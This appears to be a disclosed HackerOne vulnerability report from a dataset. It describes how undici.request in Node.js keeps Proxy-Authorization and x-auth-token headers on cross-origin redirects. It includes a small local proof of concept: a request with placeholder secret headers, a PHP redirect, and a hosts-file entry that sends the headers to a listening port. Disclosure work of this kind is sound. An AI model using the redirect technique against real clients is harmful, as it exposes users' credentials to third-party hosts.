---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2408074'
original_report_id: '2408074'
title: Proxy-Authorization header not cleared on cross-origin redirect in undici.request
weakness: Insufficiently Protected Credentials
team_handle: nodejs
created_at: '2024-03-08T04:43:40.119Z'
disclosed_at: '2024-05-03T17:41:07.159Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- insufficiently-protected-credentials
---

# Proxy-Authorization header not cleared on cross-origin redirect in undici.request

## Metadata

- HackerOne Report ID: 2408074
- Weakness: Insufficiently Protected Credentials
- Program: nodejs
- Disclosed At: 2024-05-03T17:41:07.159Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**: Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.

**Description:** 
Like https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3, this is a fixed security issue in v5.28.3, v6.6.1, but I have tested the new version(v6.7.0) and it has not been fixed yet.

## Steps To Reproduce:
POC:
```
var undici = require('undici');

const {
    statusCode,
    headers,
    trailers,
    body
} = undici.request({
    method: 'GET',
    maxRedirections: 1,
    origin: "http://127.0.0.1/", 
    pathname: "",
    headers: {
        'content-type': 'application/json',
        'Cookie': 'secret Cookie',
        'Authorization': 'secret Authorization',
        'Proxy-Authorization': 'secret Proxy-Authorization',
        'x-auth-token': 'secret x-auth-token',
        'Host': 'test.cn'
    }
})
```

The http://127.0.0.1/ is a redirect server. Sourcecode:
```
<?php
header("Location: http://a.com:2333");
?>
```
Add the 1 record in the /etc/hosts file: 
```
127.0.0.1   a.com
```

Listening on port 2333 and discovering that Proxy-Authorization and x-auth-token headers has been passed.
{F3105815}



## Impact: 
```<=undici@6.7.0```

## Supporting Material/References:
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization

## Impact

Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
